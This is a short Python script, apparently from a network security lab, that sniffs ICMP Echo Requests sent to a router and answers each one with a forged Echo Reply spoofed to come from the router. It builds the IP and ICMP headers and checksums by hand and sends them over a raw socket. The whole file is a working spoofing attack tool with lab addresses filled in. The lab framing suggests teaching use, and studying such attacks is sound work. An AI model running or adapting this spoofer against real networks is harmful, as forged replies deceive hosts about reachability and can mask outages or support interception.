#!/usr/bin/env python3
import socket, struct
from scapy.all import sniff, IP, ICMP, conf

# allow BPF filters
conf.use_pcap = True

# ─── YOUR NETWORK ───────────────────────────────────────────────────────────────
ROUTER_IP = "20.20.0.2"    # router2’s IP on net_att_rout
VICTIM_IP = "20.10.0.2"    # victim2’s IP on net_vict_att
IFACE     = "eth0"         # attacker2’s victim-side interface

# ─── CHECKSUM HELPER ────────────────────────────────────────────────────────────
def check(data: bytes) -> int:
    if len(data) % 2:
        data += b'\x00'
    s = sum(struct.unpack(f'!{len(data)//2}H', data))
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

# ─── PACKET HANDLER ─────────────────────────────────────────────────────────────
def handleRequest(pkt):
    # only handle ICMP Echo Requests destined for the router
    if IP in pkt and ICMP in pkt and pkt[IP].dst == ROUTER_IP and pkt[ICMP].type == 8:
        icmp = pkt[ICMP]
        print(f"Sniffed Echo Request id={icmp.id}, seq={icmp.seq}")

        # build forged IP header (src=router, dst=victim)
        ip_hdr = struct.pack(
            "!BBHHHBBH4s4s",
            (4<<4)|5, 0,
            20 + 8 + len(icmp.payload),
            0, 0,
            64,                          # TTL (you can adjust if you like)
            socket.IPPROTO_ICMP,
            0,
            socket.inet_aton(ROUTER_IP),
            socket.inet_aton(VICTIM_IP),
        )
        ip_hdr = ip_hdr[:10] + struct.pack("!H", check(ip_hdr)) + ip_hdr[12:]

        # build ICMP Echo-Reply header + payload
        payload    = bytes(icmp.payload)
        icmp_pfx   = struct.pack("!BBHHH", 0, 0, 0, icmp.id, icmp.seq)
        icmp_cksum = check(icmp_pfx + payload)
        icmp_hdr   = struct.pack("!BBHHH", 0, 0, icmp_cksum, icmp.id, icmp.seq)

        packet = ip_hdr + icmp_hdr + payload

        # send your spoofed reply back to the victim
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as s:
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            s.sendto(packet, (VICTIM_IP, 0))

        print(f"Sent spoofed Echo Reply to {VICTIM_IP}")

# ─── MAIN ────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print(f"Listening for ICMP Echo Requests to {ROUTER_IP} on {IFACE}…")
    sniff(
        iface=IFACE,
        filter=f"icmp and dst {ROUTER_IP}",
        prn=handleRequest
    )
